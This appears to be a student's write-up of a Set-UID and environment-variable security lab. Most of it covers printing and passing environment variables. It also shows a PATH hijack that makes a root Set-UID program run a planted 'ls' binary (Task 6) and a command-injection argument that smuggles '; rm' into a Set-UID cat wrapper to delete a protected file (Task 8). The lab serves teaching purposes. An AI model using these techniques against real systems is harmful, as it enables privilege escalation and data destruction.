## Environment Variable and Set-UID Lab

# Task 1

To print out the environment variables, we can use 'printenv' or 'env'.

```
$ printenv
```
Output:

```
SHELL=/bin/bash
SESSION_MANAGER=local/VM:@/tmp/.ICE-unix/1985,unix/VM:/tmp/.ICE-unix/1985
QT_ACCESSIBILITY=1
COLORTERM=truecolor
XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
XDG_MENU_PREFIX=gnome-
GNOME_DESKTOP_SESSION_ID=this-is-deprecated
GNOME_SHELL_SESSION_MODE=ubuntu
SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
XMODIFIERS=@im=ibus
DESKTOP_SESSION=ubuntu
SSH_AGENT_PID=1948
GTK_MODULES=gail:atk-bridge
PWD=/home/seed
LOGNAME=seed
XDG_SESSION_DESKTOP=ubuntu
XDG_SESSION_TYPE=x11
GPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1
XAUTHORITY=/run/user/1000/gdm/Xauthority
GJS_DEBUG_TOPICS=JS ERROR;JS LOG
WINDOWPATH=2
HOME=/home/seed
USERNAME=seed
IM_CONFIG_PHASE=1
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
XDG_CURRENT_DESKTOP=ubuntu:GNOME
VTE_VERSION=6003
GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/db58def4_d40c_4a10_8668_cbead35dcca0
INVOCATION_ID=8418fb3a1d6f457b96a0c84a77fe54c6
MANAGERPID=1743
GJS_DEBUG_OUTPUT=stderr
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=seed
GNOME_TERMINAL_SERVICE=:1.111
DISPLAY=:0
SHLVL=1
QT_IM_MODULE=ibus
XDG_RUNTIME_DIR=/run/user/1000
JOURNAL_STREAM=9:36111
XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share/:/usr/share/:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:.
GDMSESSION=ubuntu
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
_=/usr/bin/printenv
```

To print specific variables we can use the 'printenv PWD'command.
```
$ printenv PWD
```
Output:
```
/home/seed
```

We can use 'export' and 'unset' to set or unset variables.
```
$ export
```
Output:
```
declare -x COLORTERM="truecolor"
declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1000/bus"

(...)

declare -x XMODIFIERS="@im=ibus"
```
Adding a test variable to export:
```
$ export test="hello"
$ export
```
Output:
```
declare -x COLORTERM="truecolor"
declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1000/bus"

(...)

declare -x XMODIFIERS="@im=ibus"
declare -x test="hello"
```
```
$ printenv test
```
Output:
```
hello
```
And then we can unset the test variable.
```
$ unset test
$ export
```
Output:
```
declare -x COLORTERM="truecolor"
declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1000/bus"

(...)

declare -x XMODIFIERS="@im=ibus"
```

# Task 2

For this task, we initially print out the environment variables of the child process to a text file.
```
$ gcc myprintenv.c
$ a.out > file1.txt
```
Then we change the program to only print the parent's environment variables.
```
$ gcc myprintenv.c
$ a.out > file2.txt
```
Then we use 'diff' to see the differences in the text files, it returns empty, meaning the environment variables are the same in both processes.
```
$ diff file1.txt file2.txt

```

# Task 3

For this task, when running the 'myenv.c' file, with NULL in the third argument of the 'execve()' (it calls a system call to load a new command and execute it), we get an empty output.
```
$ gcc myenv.c -o myenv
$ ./myenv

```
After changing the invocation of 'execve()' by putting 'environ' in the third argument, we get the environment variables.
```
$ gcc myenv.c -o myenv
$ ./myenv
```
Output:
```
SHELL=/bin/bash
SESSION_MANAGER=local/VM:@/tmp/.ICE-unix/1985,unix/VM:/tmp/.ICE-unix/1985

(...)

OLDPWD=/home/seed/Desktop/seed-labs/category-software/Environment_Variable_and_SetUID
_=./myenv
```

# Task 4

By using 'system()', it executes '/bin/sh -c command'. We can confirm by the output that the environment variables of the calling program are passed to the new program.

```
$ gcc sys.c -o sys
$ ./sys
```
Output:
```
GJS_DEBUG_TOPICS=JS ERROR;JS LOG
LESSOPEN=| /usr/bin/lesspipe %s
USER=seed

(...)

VTE_VERSION=6003
```

# Task 5

For this task, we are studying Set-UID programs. When they run, they assume the owner's prvileges (eg., if the owner is root, when someone runs the program, it gains the root's privileges during execution).
Firstly, we write a program that can print out all the environment variables in the current process.
```
$ gcc print_all_env.c -o foo
```
Then we change the ownership to root:
```
$ sudo chown root foo
$ sudo chmod 4755 foo
```
Then we changed some environment variables
```
$ export PATH=/usr/bin:/bin
$ export LD_LIBRARY_PATH=/home/Desktop
$ export TEST=testing
```
Now, running the Set-UID program:
```
$ ./foo
```
Output:
```
SHELL=/bin/bash
SESSION_MANAGER=local/VM:@/tmp/.ICE-unix/2025,unix/VM:/tmp/.ICE-unix/2025
QT_ACCESSIBILITY=1
COLORTERM=truecolor
XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
XDG_MENU_PREFIX=gnome-
GNOME_DESKTOP_SESSION_ID=this-is-deprecated
GNOME_SHELL_SESSION_MODE=ubuntu
SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
XMODIFIERS=@im=ibus
DESKTOP_SESSION=ubuntu
SSH_AGENT_PID=1986
GTK_MODULES=gail:atk-bridge
PWD=/home/seed/Desktop/seed-labs/category-software/Environment_Variable_and_SetUID/Labsetup
LOGNAME=seed
XDG_SESSION_DESKTOP=ubuntu
XDG_SESSION_TYPE=x11
GPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1
XAUTHORITY=/run/user/1000/gdm/Xauthority
GJS_DEBUG_TOPICS=JS ERROR;JS LOG
WINDOWPATH=2
HOME=/home/seed
USERNAME=seed
IM_CONFIG_PHASE=1
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
XDG_CURRENT_DESKTOP=ubuntu:GNOME
VTE_VERSION=6003
GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/8fd02f75_e94e_4e6d_9230_1e0f139e91a6
INVOCATION_ID=a850f03a201642cfbf716dd677adee47
MANAGERPID=1779
GJS_DEBUG_OUTPUT=stderr
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=seed
GNOME_TERMINAL_SERVICE=:1.115
DISPLAY=:0
SHLVL=1
QT_IM_MODULE=ibus
XDG_RUNTIME_DIR=/run/user/1000
JOURNAL_STREAM=9:35708
XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share/:/usr/share/:/var/lib/snapd/desktop
PATH=/usr/bin:/bin
GDMSESSION=ubuntu
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
TEST=testing
OLDPWD=/home/seed/Desktop/seed-labs/category-software/Environment_Variable_and_SetUID
_=./foo
```
As we can see, all the environment variables got into the Set-UID process except for LD_LIBRARY_PATH, a variable that defines where the system looks for libraries when running programs. This is because the system automatically removes certain environment variables for security reasons to prevent privilege escalation exploits in Set-UID programs.

# Task 6

In this task, we create a Set-UID program that invokes system() with the 'ls' command.
```
$ gcc setuid_ls.c -o setuid_ls
````
We changed the ownership to root and made it a Set-UID program.
```
$ sudo chown root setuid_ls
$ sudo chmod 4755 setuid_ls
```
Then, we created a fake malicious program in '/home/seed/Desktop/fakeMalware' 
```
#include <stdio.h>

int main()
{
printf("This is a fake malware \n");
return 0;
}
```
```
$ gcc fake.c -o ls
```
Then we changed the 'PATH' variable to the fake malware directory.
```
$ export PATH=/home/seed/Desktop/fakeMalware
```
Finally, we ran the setuid_ls program.
```
$ ./setuid_ls
This is a fake malware 
```
As demonstrated, running the Set-UID program executed our malicious 'ls' instead of the expected system command. This is a very serious security vulnerability, because it allows a user to execute arbitrary code with elevated privileges.

# Task 8 - Step 1

Firstly, we compiled 'catall.c'.
```
$ gcc catall.c -o catall
```
We changed the ownership to root and made it a Set-UID program.

```
$ sudo chown root catall
$ sudo chmod 4755 catall
```

Then we create a new file that can't be read by the default user ('seed').
```
$ echo "Secret file" > /home/seed/Desktop/secret.txt
$ sudo chown root /home/seed/Desktop/secret.txt
$ sudo chmod 000 /home/seed/Desktop/secret.txt
```
To test that we can't read the file as 'seed':
```
$ whoami
seed
$ ./catall /home/seed/Desktop/secret.txt
/bin/cat: /home/seed/Desktop/secret.txt: Permission denied
```
Then, by using a semicolon (;), it allowed us to chain commands, enabling us to input aditional commands that the shell will execute.
```
$ ./catall '/home/seed/Desktop/secret.txt; rm /home/seed/Desktop/secret.txt'
/bin/cat: /home/seed/Desktop/secret.txt: Permission denied
```
Although the program could not read the file due to permissions, it executed the additional 'rm' command, which deleted the file.
```
$ ls /home/seed/Desktop/secret.txt
ls: cannot access '/home/seed/Desktop/secret.txt': No such file or directory
```
So, we successfully deleted the file using the 'catall' program.

